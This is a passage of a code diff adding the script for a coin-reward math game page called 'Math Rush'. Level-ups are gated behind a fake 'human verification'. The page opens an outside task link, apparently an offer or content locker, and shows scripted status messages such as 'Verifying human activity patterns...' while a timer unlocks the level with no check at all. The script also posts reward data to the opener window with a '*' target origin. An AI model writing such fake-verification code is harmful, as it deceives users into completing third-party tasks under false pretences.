+                setTimeout(() => {
+                    els.input.focus();
+                    generateQuestion();
+                }, 500);
+            }
+        }
+
+        function handleWrong() {
+            GameState.wrongAnswers++;
+            GameState.currentStreak = 0;
+            showFeedback('Wrong!', 'wrong');
+            updateUI();
+            setTimeout(() => {
+                els.input.focus();
+                generateQuestion();
+            }, 1000);
+        }
+
+        function showFeedback(text, type) {
+            els.feedback.textContent = text;
+            els.feedback.className = 'feedback-msg ' + type;
+            setTimeout(() => {
+                els.feedback.textContent = '';
+            }, 800);
+        }
+
+        function addXP(amount) {
+            if(GameState.level >= GameState.maxLevel || GameState.isLocked) return;
+            
+            GameState.xp += amount;
+            
+            while(GameState.xp >= GameState.xpToNext && GameState.level < GameState.maxLevel && !GameState.isLocked) {
+                GameState.xp -= GameState.xpToNext;
+                prepareLevelUp();
+            }
+        }
+
+        function prepareLevelUp() {
+            GameState.pendingLevel = GameState.level + 1;
+            GameState.isLocked = true;
+            GameState.gameActive = false;
+            clearInterval(GameState.timer);
+            saveGameData();
+            showLevelUpOverlay();
+        }
+
+        function showLevelUpOverlay() {
+            document.getElementById('newLevel').textContent = GameState.pendingLevel || GameState.level + 1;
+            document.getElementById('levelUpOverlay').classList.add('active');
+            document.getElementById('pendingBadge').style.display = 'inline-flex';
+            createConfetti();
+        }
+
+        function proceedToVerification() {
+            document.getElementById('levelUpOverlay').classList.remove('active');
+            document.getElementById('verifyLevel').textContent = GameState.pendingLevel;
+            document.getElementById('verificationOverlay').classList.add('active');
+        }
+
+        function startCaptchaVerification() {
+            // Show task reminder
+            document.getElementById('taskReminder').classList.add('active');
+            
+            // Hide buttons
+            document.getElementById('verificationButtons').style.display = 'none';
+            
+            // Show CAPTCHA
+            document.getElementById('captchaContainer').classList.add('active');
+            
+            // Start verification process
+            initiateVerification('captcha');
+            
+            showToast('Please complete the CAPTCHA below', 'info');
+        }
+
+        function startHumanVerification() {
+            // Show task reminder
+            document.getElementById('taskReminder').classList.add('active');
+            
+            // Open verification link
+            window.open('https://confirmapp.online/cl/i/5nn8m3', '_blank');
+            
+            // Start verification process
+            initiateVerification('human');
+            
+            // Show loading state
+            document.getElementById('verificationButtons').style.display = 'none';
+            document.getElementById('humanVerificationWrapper').classList.add('active');
+            
+            showToast('Complete the task in the new window', 'info');
+        }
+
+        function initiateVerification(type) {
+            GameState.isVerifying = true;
+            GameState.verificationStartTime = Date.now();
+            GameState.verificationTabOpen = true;
+            
+            // Save progress
+            saveVerificationProgress();
+            
+            // Start progress tracking
+            startProgressTracking();
+        }
+
+        function startProgressTracking() {
+            if(GameState.verificationTimer) clearInterval(GameState.verificationTimer);
+            
+            GameState.verificationTimer = setInterval(() => {
+                checkVerificationProgress();
+            }, UPDATE_INTERVAL);
+            
+            checkVerificationProgress();
+        }
+
+        function checkVerificationProgress() {
+            const elapsed = Date.now() - GameState.verificationStartTime;
+            const progress = Math.min((elapsed / VERIFICATION_DURATION) * 100, 100);
+            
+            GameState.verificationProgress = progress;
+            document.getElementById('progressFill').style.width = progress + '%';
+            
+            const statusTexts = [
+                { threshold: 0, text: 'Initializing verification...' },
+                { threshold: 10, text: 'Connecting to verification server...' },
+                { threshold: 25, text: 'Analyzing task completion...' },
+                { threshold: 40, text: 'Verifying human activity patterns...' },
+                { threshold: 55, text: 'Cross-referencing task data...' },
+                { threshold: 70, text: 'Performing security checks...' },
+                { threshold: 85, text: 'Finalizing verification process...' },
+                { threshold: 95, text: 'Almost complete...' }
+            ];
+            
+            const currentStatus = statusTexts.reverse().find(s => progress >= s.threshold);
+            if(currentStatus) document.getElementById('progressText').textContent = currentStatus.text;
+            
+            saveVerificationProgress();
+            
+            if(elapsed >= VERIFICATION_DURATION) {
+                clearInterval(GameState.verificationTimer);
+                completeVerification();
+            }
+        }
+
+        function completeVerification() {
+            GameState.isVerifying = false;
+            clearVerificationProgress();
+            
+            if(GameState.pendingLevel) {
+                GameState.level = GameState.pendingLevel;
+                GameState.xpToNext = XP_TABLE[GameState.level - 1] || 999999;
+            }
+            
+            GameState.isLocked = false;
+            GameState.pendingLevel = null;
+            GameState.verified = true;
+            
+            saveGameData();
+            
+            document.getElementById('humanVerificationWrapper').classList.remove('active');
+            document.getElementById('captchaContainer').classList.remove('active');
+            document.getElementById('taskReminder').classList.remove('active');
+            document.getElementById('verificationSuccess').classList.add('active');
+            
+            const statusIndicator = document.getElementById('statusIndicator');
+            statusIndicator.classList.remove('processing');
+            statusIndicator.classList.add('completed');
+            statusIndicator.innerHTML = '<span class="status-dot"></span><span>Verification completed!</span>';
+            
+            document.getElementById('pendingBadge').style.display = 'none';
+            
+            showToast('Verification complete! Level unlocked!', 'success');
+            createConfetti();
+            updateUI();
+            
+            localStorage.setItem('mathRush_verification_complete', JSON.stringify({
+                verified: true,
+                timestamp: Date.now(),
+                level: GameState.level
+            }));
+            
+            setTimeout(() => {
+                document.getElementById('verificationOverlay').classList.remove('active');
+                document.getElementById('verificationSuccess').classList.remove('active');
+                document.getElementById('verificationButtons').style.display = 'flex';
+                
+                const indicator = document.getElementById('statusIndicator');
+                indicator.classList.remove('completed');
+                indicator.classList.add('processing');
+                indicator.innerHTML = '<span class="status-dot"></span><span id="statusText">Processing verification...</span>';
+                
+                startGame(); // Resume game
+            }, 2500);
+        }
+
+        function checkOngoingVerification() {
+            const saved = localStorage.getItem('mathRush_verification_progress');
+            if(saved) {
+                const data = JSON.parse(saved);
+                if(data.isVerifying && data.pendingLevel === GameState.pendingLevel) {
+                    const elapsed = Date.now() - data.startTime;
+                    if(elapsed < VERIFICATION_DURATION) {
+                        resumeVerification(data.startTime);
+                    } else {
+                        completeVerification();
+                    }
+                }
+            }
+        }
+
+        function resumeVerification(startTime) {
+            GameState.isVerifying = true;
+            GameState.verificationStartTime = startTime;
+            document.getElementById('taskReminder').classList.add('active');
+            document.getElementById('verificationButtons').style.display = 'none';
+            document.getElementById('humanVerificationWrapper').classList.add('active');
+            startProgressTracking();
+            showToast('Resuming verification...', 'info');
+        }
+
+        function updateUI() {
+            els.level.textContent = GameState.level;
+            els.currentXp.textContent = GameState.xp;
+            els.targetXp.textContent = GameState.xpToNext.toLocaleString();
+            
+            const xpPct = (GameState.xp / GameState.xpToNext) * 100;
+            els.xpBar.style.width = xpPct + '%';
+            
+            if(GameState.level >= GameState.maxLevel) document.getElementById('maxBadge').style.display = 'inline-flex';
+            if(GameState.isLocked) document.getElementById('pendingBadge').style.display = 'inline-flex';
+            
+            els.correct.textContent = GameState.correctAnswers;
+            els.wrong.textContent = GameState.wrongAnswers;
+            els.streak.textContent = GameState.currentStreak;
+            
+            els.claimAmount.textContent = Math.floor(GameState.currentScore).toLocaleString();
+            els.sessionEarnings.textContent = Math.floor(GameState.totalEarned).toLocaleString();
+            
+            els.claimBtn.disabled = GameState.currentScore < 50 || GameState.isLocked;
+        }
+
+        function endGame() {
+            GameState.gameActive = false;
+            clearInterval(GameState.timer);
+            els.input.disabled = true;
+            els.question.textContent = "Session Complete!";
+            els.timerBar.style.width = '0%';
+            showToast('Maximum coins reached! Claim now!', 'success');
+        }
+
+        function claimEarnings() {
+            if(GameState.currentScore < 50 || GameState.claimed || GameState.isLocked) return;
+            
+            const amount = Math.floor(GameState.currentScore);
+            
+            // Post to opener
+            if(window.opener) {
+                window.opener.postMessage({
+                    type: 'GAME_REWARD',
+                    gameId: 'mathrush',
+                    coins: amount
+                }, '*');
+            }
+            
+            // Save to main app storage
+            try {
+                const saved = localStorage.getItem('gameCoinPro_v4');
+                if(saved) {
+                    const data = JSON.parse(saved);
+                    data.coins = (data.coins || 0) + amount;
+                    data.gamesPlayed = (data.gamesPlayed || 0) + 1;
+                    data.todayEarned = (data.todayEarned || 0) + amount;
+                    data.totalEarned = (data.totalEarned || 0) + amount;
+                    
+                    const historyItem = {
+                        id: Date.now(),
+                        amount: amount,
+                        source: 'Math Rush',
+                        sourceId: 'mathrush',
+                        isNegative: false,
+                        timestamp: new Date().toISOString()
+                    };
+                    data.history = data.history || [];
+                    data.history.unshift(historyItem);
+                    if(data.history.length > 100) data.history.pop();
+                    
+                    localStorage.setItem('gameCoinPro_v4', JSON.stringify(data));
+                }
+            } catch(e) { console.error('Error saving:', e); }
+            
+            GameState.claimed = true;
+            GameState.currentScore = 0;
+            saveGameData();
+            updateUI();
+            loadMainAppData();
+            
+            showToast(`Claimed ${amount} coins!`, 'success');
+            
+            els.claimBtn.innerHTML = '<i class="fas fa-check"></i> Claimed!';
+            els.claimBtn.disabled = true;
+            
+            setTimeout(goBack, 2000);
+        }
+
+        // Data Management
+        function loadGameData() {
+            try {
+                const saved = localStorage.getItem('mathRush_v1_save');
+                if(saved) {
+                    const data = JSON.parse(saved);
+                    GameState.level = data.level || 1;
+                    GameState.xp = data.xp || 0;
+                    GameState.xpToNext = XP_TABLE[GameState.level - 1] || 100;
+                    GameState.bestStreak = data.bestStreak || 0;
+                    GameState.correctAnswers = data.correctAnswers || 0;
+                    GameState.wrongAnswers = data.wrongAnswers || 0;
+                    GameState.totalEarned = data.totalEarned || 0;
+                    GameState.verified = data.verified || false;
+                    GameState.isLocked = data.isLocked || false;
+                    GameState.pendingLevel = data.pendingLevel || null;
+                }
+            } catch(e) { console.error('Error loading:', e); }
+        }
+
+        function saveGameData() {
+            try {
+                const data = {
+                    level: GameState.level,
+                    xp: GameState.xp,
+                    bestStreak: GameState.bestStreak,
+                    correctAnswers: GameState.correctAnswers,
+                    wrongAnswers: GameState.wrongAnswers,
+                    totalEarned: GameState.totalEarned,
+                    verified: GameState.verified,
+                    isLocked: GameState.isLocked,
+                    pendingLevel: GameState.pendingLevel,
+                    lastSave: Date.now()
+                };
+                localStorage.setItem('mathRush_v1_save', JSON.stringify(data));
+            } catch(e) { console.error('Error saving:', e); }
+        }
+
+        function saveVerificationProgress() {
+            try {
+                const data = {
+                    isVerifying: GameState.isVerifying,
+                    startTime: GameState.verificationStartTime,
+                    pendingLevel: GameState.pendingLevel,
+                    lastUpdate: Date.now()
+                };
+                localStorage.setItem('mathRush_verification_progress', JSON.stringify(data));
+            } catch(e) { console.error('Error saving verification:', e); }
+        }
+
+        function clearVerificationProgress() {
+            localStorage.removeItem('mathRush_verification_progress');
+        }
+
+        function loadMainAppData() {
+            try {
+                const saved = localStorage.getItem('gameCoinPro_v4');
+                if(saved) {
+                    const data = JSON.parse(saved);
+                    GameState.mainAppCoins = data.coins || 0;
+                    els.mainBalance.textContent = GameState.mainAppCoins.toLocaleString();
+                }
+            } catch(e) { console.error('Error loading main app:', e); }
+        }
+
+        function handleStorageChange(e) {
+            if(e.key === 'mathRush_verification_complete') {
+                const data = JSON.parse(e.newValue);
+                if(data && data.verified && data.timestamp > (GameState.verificationStartTime || 0)) {
+                    completeVerification();
+                }
+            }
+        }
+
+        function handleVisibilityChange() {
+            if(!document.hidden && GameState.isVerifying) {
+                checkVerificationProgress();
+            }
+        }
+
+        // Utilities
+        function createConfetti() {
+            const colors = ['#f59e0b', '#10b981', '#3b82f6', '#ec4899', '#8b5cf6'];
+            for(let i=0; i<30; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                document.body.appendChild(confetti);
+                setTimeout(() => confetti.remove(), 4000);
+            }
+        }
+
+        function showToast(message, type) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            
+            const icons = {
+                success: 'fa-check-circle',
+                error: 'fa-exclamation-circle',
+                warning: 'fa-exclamation-triangle',
+                info: 'fa-info-circle'
+            };
+            
+            toast.innerHTML = `<i class="fas ${icons[type]} toast-icon"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        function goBack() {
+            saveGameData();
+            if(window.opener) window.close();
+            else window.history.back();
+        }
+
+        // Prevent zoom on double tap
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', (e) => {
+            const now = Date.now();
+            if(now - lastTouchEnd <= 300) e.preventDefault();
+            lastTouchEnd = now;
+        }, false);
+
+        window.addEventListener('beforeunload', () => {
+            saveGameData();
+            if(GameState.isVerifying) saveVerificationProgress();
+        });
+    </script>
+</body>
+</html>
